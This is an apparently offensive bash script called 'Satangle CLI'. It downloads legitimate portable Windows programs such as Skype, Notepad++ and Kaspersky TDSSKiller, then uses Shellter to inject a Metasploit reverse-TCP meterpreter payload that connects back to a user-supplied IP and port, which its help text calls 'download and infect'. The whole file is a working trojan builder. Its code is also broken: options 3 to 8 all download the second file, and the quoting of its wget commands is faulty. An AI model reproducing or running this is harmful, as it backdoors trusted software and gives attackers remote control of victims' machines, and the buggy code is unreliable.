#!/bin/bash
FiLe1="wget -q "https://downloads.sourceforge.net/project/portableapps/Isotoxin%20Portable/IsotoxinPortable_0.4.503.paf.exe" -O "IsoToxinPortable.exe""
FiLe2="wget -q "https://downloads.sourceforge.net/project/portableapps/Kaspersky%20TDSSKiller%20Portable/KasperskyTDSSKillerPortable_3.1.0.12_English_online.paf.exe" -O "Kaspersky_TDSSKiller.exe""
FiLe3="wget -q "https://downloads.sourceforge.net/project/portableapps/Dont%20Panic%20Portable/DontPanicPortable_3.1.0.paf.exe" -O "DontPanic.exe""
FiLe4="wget -q "http://download3.portableapps.com/portableapps/gpu-zportable/GPU-ZPortable_1.17.0.paf.exe" -O "GPU-Z_Portable.exe""
FiLe5="wget -q "http://downloads.sourceforge.net/portableapps/PeerBlockPortable_1.2_English.paf.exe" -O "PeerBlock.exe""
FiLe6="wget -q "http://download3.portableapps.com/portableapps/spybotportable/SpybotPortable_2.5.paf.exe" -O "Spybot2.5.exe""
FiLe7="wget -q "http://portableapps.com/redirect/?a=SkypePortable&t=http%3A%2F%2Fdownloads.portableapps.com%2Fportableapps%2Fskypeportable%2FSkypePortable_7.32.0.104_online.paf.exe" -O "Skype.exe""
FiLe8="wget -q "http://sourceforge.net/projects/portableapps/files/Notepad%2B%2B%20Portable/NotepadPlusPlusPortable_7.3.3.paf.exe" -O "Notepad++.exe""
echo -e "\e[0;49;31m                 ▄▄▄▓▓▓▓▓▓▄▄▄"
echo -e "\e[0;49;31m          ▀██▄▄▓▓▀▀▀   ░   ▀▀▀▓▓▄▄█▓▀"
echo -e "\e[0;49;31m           ▄███▄               ▄███▄"
echo -e "\e[0;49;31m         ▄▓▀ ▀▓██▄░          ▄██▓▀ ▀█▄"
echo -e "\e[0;49;31m        █▓░   ▀█▌▀▓█▄     ▄█▓▀▐█▀    ██"
echo -e "\e[0;49;31m       █▓▒     ▐█  ▀▓▓▓▄███▀░ ▓▌      ██"
echo -e "\e[0;49;31m      ▐█▌░      █▌  ▄█▓▀▓▓▄  ▐█       ▐█▌"
echo -e "\e[0;49;31m      ▓█        ▐█▄█▀ ▒   ▀█▄█▌        ▓█"
echo -e "\e[0;49;31m      ▓█      ▄▄███   ░     █▓▓▄▄     ░▓█"
echo -e "\e[0;49;31m      ▓█  ▄▄▓▓▀▀  ▓█       █▓  ▀▀▓▓▄▄░▒▓█"
echo -e "\e[0;49;31m      ▓████▀░░▄▄▄▄▄▓█▓▀▀▀▓█▓▄▄▄▄▄ ░▀██▓██"
echo -e "\e[0;49;31m  ▄▄██▀██▀▀▀▀▀▀     █▓░ ░▓█    ▀▀▀▀▀▀▀██▀██▄▄"
echo -e "\e[0;49;31m▀▀▀     █▓░         ▐▓░ ░▓▌          █▓     ▀▀▀"
echo -e "\e[0;49;31m         █▓░         █▌ ▐█          █▓"
echo -e "\e[0;49;31m          ▀▓▄        ▐█░█▌        ▄▓▀"
echo -e "\e[0;49;31m            ▀██▄▄     █▒█     ▄▄█▓▀"
echo -e "\e[0;49;31m               ▀▀▓▓▓▄▄█▓█▄▄▓▓▓▀▀"
echo -e "\e[0;49;31m                    ▀▀███▀▀"
echo -e "\e[0;49;31m                      ▐█▌"
echo -e "\e[0;49;31m                       ▓"
echo -e "\e[0;49;31m                       ▒"
echo -e "\e[0;49;31m                       ░"
echo ' @@@@@@  @@@@@@  @@@@@@@  @@@@@@  @@@  @@@  @@@@@@@  @@@      @@@@@@@@'
echo '!@@     @@!  @@@   @@!   @@!  @@@ @@!@!@@@ !@@       @@!      @@!'
echo ' !@@!!  @!@!@!@!   @!!   @!@!@!@! @!@@!!@! !@! @!@!@ @!!      @!!!:!'
echo '    !:! !!:  !!!   !!:   !!:  !!! !!:  !!! :!!   !!: !!:      !!:'
echo '::.: :   :   : :    :     :   : : ::    :   :: :: :  : ::.: : : :: :::'
echo ''
echo '                            CLI VERSION 1.0                      '
echo ''
echo ''
if [ $# -eq 0 ]; then
	echo "Only use one at a time. (Not finished yet...)"
	echo "--file <filename ID> ~ Select file to download and infect."
	echo "--help ~ Show this menu."
	echo "--list-files ~ Lists files with ID."
fi
if [[ $1 = "--help" ]]; then
	echo "Only use one at a time. (Not finished yet...)"
	echo "--file <filename ID> ~ Select file to download and infect."
	echo "--help ~ Show this menu."
	echo "--list-files ~ Lists files with ID."
fi
if [[ $1 = "--list-files" ]]; then
	echo "1 = IsoToxinPortable.exe"
	echo "2 = Kaspersky_TDSSKiller.exe"
	echo "3 = DontPanic.exe"
	echo "4 = GPU-Z_Portable.exe"
	echo "5 = PeerBlock.exe"
	echo "6 = Spybot2.5.exe"
	echo "7 = Skype.exe"
	echo "8 = Notepad++.exe"
fi
if [[ $1 = "--file" ]]; then
	if [[ $2 = "1" ]]; then
		echo "Downloading file..."
		$FiLe1
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "IsoToxinPortable.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi
	if [[ $2 = "2" ]]; then
		echo "Downloading file..."
		$FiLe2
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "Kaspersky_TDSSKiller.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi
		if [[ $2 = "3" ]]; then
		echo "Downloading file..."
		$FiLe2
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "DontPanic.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi
	if [[ $2 = "4" ]]; then
		echo "Downloading file..."
		$FiLe2
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "GPU-Z_Portable.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi
	if [[ $2 = "5" ]]; then
		echo "Downloading file..."
		$FiLe2
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "PeerBlock.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi
	if [[ $2 = "6" ]]; then
		echo "Downloading file..."
		$FiLe2
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "Spybot2.5.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi
	if [[ $2 = "7" ]]; then
		echo "Downloading file..."
		$FiLe2
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "Skype.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi
	if [[ $2 = "8" ]]; then
		echo "Downloading file..."
		$FiLe2
		echo "Note: The CLI version of Satangle currently only supports a reverse TCP meterpreter."
		echo "What port do you wanna use?"
		read -p "Satangle-CLI>> " PORTARG
		echo "What IP do you wanna use to connect back to?"
		read -p "Satangle-CLI>> " HOSTARG
		wine "/usr/share/shellter/shellter.exe" -a -f "Notepad++.exe" -p meterpreter_reverse_tcp --lhost "$HOSTARG" --port "$PORTARG"
	fi

fi